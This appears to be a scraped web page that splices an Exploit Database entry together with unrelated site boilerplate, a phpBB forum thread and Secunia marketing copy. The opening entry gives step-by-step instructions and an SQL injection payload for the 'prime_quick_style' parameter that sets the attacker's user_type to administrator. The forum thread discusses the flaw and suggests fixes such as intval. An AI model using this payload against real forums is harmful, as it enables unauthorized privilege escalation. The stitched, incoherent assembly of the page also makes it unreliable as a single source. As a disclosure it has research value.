#	phpBB3 addon prime_quick_style GetAdmin Exploit
#
#	Vulnerability found and exploited by -SmoG-
#
#	target file: prime_quick_style.php
#
#
#   vuln: POST parameter "prime_quick_style" is injectable.
#   source: http://www.phpbb.com/community/viewtopic.php?f=70&t=692625
#
#	HowTo: after login, go to "./ucp.php" and manipulate the content from the "prime_quick_style"-parameter.
#	example: prime_quick_style = "5,user_type = 3, user_permissions = ''"
#
#	query will be look like this: "UPDATE USER_TABLE SET user_style = ANY_STYLE(integer), user_type = 3, user_permissions = '' WHERE user_id = YourId"

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Hi, this is my first time visiting the development part of the MOD DB and I"m not familiar with the rules. I just wanted to know if it is ok to use this in a live forum? or it's just at our own risk?

and just one more thing to ask. is there a validated version of this MOD? cuz i couldn't find one so i thought there might have been one and I've missed it. thx

I don't think there is a validated one yet, but I use this on my live forum too. I have for a couple years now. Have never had an issue with it. Works great for guest posters as well.

As for the development part of the boards... hang around here alot. You can come up with some great MODS for your board.

If your unsure, just setup a test board of your own at home using Xampp.

Code: Select all

```
$sql = 'UPDATE ' . USERS_TABLE . ' SET user_style = ' . $db->sql_escape($style) . ' WHERE user_id = ' . $user->data['user_id'];
```
Since $style is supposed to be an int you should use intval() instead of $db->sql\_escape($style).

If $style is supposed to be an int, then you should just change:

Code: Select all

```
($style = request_var('prime_quick_style', '')))
```

to:

Code: Select all

```
($style = request_var('prime_quick_style', 0)))
```

EDIT: Since other things can also be set to that variable, tumba25's change is also necessary.

Regarding the exploit:

Link removed

What *exactly* do we have to check to be sure that everything is okay?

Okay, I am still the only member with user\_type == 3. What else should be checked?

Thank you

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
